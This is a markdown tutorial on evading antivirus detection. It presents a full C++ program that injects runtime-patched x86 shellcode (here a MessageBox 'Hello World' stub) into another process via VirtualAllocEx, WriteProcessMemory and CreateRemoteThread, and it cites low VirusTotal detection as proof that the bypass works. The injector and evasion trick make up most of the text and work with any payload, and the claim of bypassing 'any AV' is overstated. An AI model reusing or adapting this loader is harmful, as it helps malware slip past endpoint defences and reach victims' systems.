# Introduction To AV Evasion
![image](https://user-images.githubusercontent.com/107004485/180807564-63e7f01c-ecb2-4016-b33c-38fd6af93680.png)

- In This Article I Will Learn You How To Bypass Any AV That Use Heuristic Based Detection Like MS Winodows Defender Using 1 Byte Change.
- We Will Explain All This Things, Keep Reading 
## What's An AV?
- First AV is the acronym for **“Antivirus”**, AV Is A Software Scan, Detect And Delete Viruses In A Computer.
### Virus Detection Techniques
- We Have 3 Detection Techniques:
  - Signature Based: Can Detect Only Viruses With Definition File About The Virus.
  - Heuristic Based: Can Detect Virus That Didn't Appeared Yet Or Already Appeared.
  - Behavior Based: Can Analyze Only Objects Behavior Or Potential Behavior.
# The 1 Byte Change Technique How It Works?
![image](https://user-images.githubusercontent.com/107004485/180821692-547f87b6-eea5-46ef-bb5a-7ef41592fc5d.png)

- I Will Give You An Example With A Shellcode Injection Technique:

  - Our Shellcode Is This(Thats Just A Simple Example): **"\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"**
**"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"**
    
    - If We Injected This Shellcode Into A Process, Windows Defender And Some AVs Will Detect It Easy, But If We Used 1 Byte Change Technique AVs Will Never Detect It.
- The Concept Of The Technique Its Like The Name Of The Technique, We Should Change The First Byte Of Our Shellcode, Put The Orginal First Byte In Another Variable And Delete It From The Shellcode And We Will Use [memcpy()](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy) To Copy The Orginal First Byte To The Shellcode 
                                                      
# We Will Do A Simple Program To Explain More About This Technique
![image](https://user-images.githubusercontent.com/107004485/180872439-983b4cf8-0240-4469-b7a4-85302597f517.png)

- Source Code Of My Program:
```C++
#include <iostream>
#include <Windows.h> 
using namespace std;
int main(void) {
    HANDLE ProcessH;
    PVOID RemoteBuff;
    HANDLE cRemoteThread;
    string szProcess;
    unsigned char shellcode[] =
        "\x31\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";
    size_t dwSize = sizeof(shellcode);
    char FirstByteOfShellcode[] = "\x33";
    ProcessH = OpenProcess(PROCESS_ALL_ACCESS, false, 1111);
    RemoteBuff = VirtualAllocEx(ProcessH, 0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode, FirstByteOfShellcode, 1);
    WriteProcessMemory(ProcessH, RemoteBuff, shellcode, dwSize, 0);
    cRemoteThread = CreateRemoteThread(ProcessH, 0, 0, (LPTHREAD_START_ROUTINE)RemoteBuff, 0, 0, 0);
    CloseHandle(ProcessH);
    return EXIT_SUCCESS;
}
```
- Explaining My Program:
	- [OpenProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) For Opening An Existing Process.
	- [VirtualAllocEx()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) For Changing The State Of The Region Of Memory.
	- [memcpy()](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy) For Copying The Original First Byte To The Fake First Byte In The 	Shellcode
	- [WriteProcessMemory()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) For Copying Data From Shellcode To The 		Address Range Of The Process.
	- [CreateRemoteThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) For Creating A Thread 	     That Run In The Virtual Address Space We Create It With The [VirtualAllocEx()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

# How Many Malwares Engines Detect My Program?
- I Tried [VirusTotal](https://virustotal.com) Because It Uses A Lot Of Malware Engines:
	- Link Of The Scan In VirusTotal : https://www.virustotal.com/gui/file/3886163eaf2b7ed9026720f68d9ce092f02f68d129eab415b9b046951c5b230e?nocache=1
		
		![image](https://user-images.githubusercontent.com/107004485/180881801-b04d1d7d-dd00-45a7-aa8e-39e7d4bf6923.png)
- This Is A Good Thing To See Because We Have Reached A Good Level In Bypassing AVs.

![image](https://user-images.githubusercontent.com/107004485/180884422-d0ee96c7-acc0-45f5-9cfc-3e4d0f4acabd.png)
# Some Memes
![image](https://user-images.githubusercontent.com/107004485/180885110-af0d02eb-9e4c-4b51-871c-674e53c325d0.png)
![image](https://user-images.githubusercontent.com/107004485/180885746-5ce4203d-14bb-405b-b51e-dda84d6d86ca.png)
![image](https://user-images.githubusercontent.com/107004485/180886109-37581ab0-242a-47fe-bf93-d77aa487f026.png)